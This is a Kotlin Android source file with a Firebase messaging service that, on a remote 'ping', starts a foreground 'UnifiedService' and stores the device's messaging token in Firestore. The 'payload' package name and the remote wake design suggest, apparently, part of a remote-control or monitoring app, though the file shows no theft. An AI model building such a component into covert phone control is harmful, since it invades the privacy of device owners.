package com.payload.jansiix0ne.services

import android.content.Intent
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class MyFirebaseMessagingService : FirebaseMessagingService() {

    private val TAG = "MyFirebaseMessaging"
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        Log.d(TAG, "FCM message received: ${remoteMessage.data}")
        
        val data = remoteMessage.data
        
        if (data.containsKey("ping") || data["type"] == "ping") {
            Log.d(TAG, "✅ Received FCM ping — waking device & starting UnifiedService")
            
            serviceScope.launch {
                try {
                    // Wake device and start service
                    applicationContext.startForegroundService(
                        Intent(applicationContext, UnifiedService::class.java)
                    )
                    Log.d(TAG, "UnifiedService start command sent")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start UnifiedService: ${e.message}", e)
                }
            }
        }
    }

    override fun onNewToken(token: String) {
        Log.d(TAG, "Refreshed token: $token")
        
        serviceScope.launch {
            try {
                // Save token to Firestore or send to server
                saveTokenToServer(token)
            } catch (e: Exception) {
                Log.e(TAG, "Error saving token", e)
            }
        }
    }

    private suspend fun saveTokenToServer(token: String) {
        try {
            val deviceId = getDeviceId()
            val repository = com.payload.jansiix0ne.repository.FirestoreRepository()
            
            // Save FCM token to device document
            repository.updateDeviceStatus(
                deviceId,
                mapOf("fcmToken" to token)
            )
            
            Log.d(TAG, "✅ Token saved to Firestore")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error saving token: ${e.message}", e)
        }
    }
    
    private fun getDeviceId(): String {
        val prefs = applicationContext.getSharedPreferences("device_info_prefs", android.content.Context.MODE_PRIVATE)
        return prefs.getString("device_id", "") ?: ""
    }
}
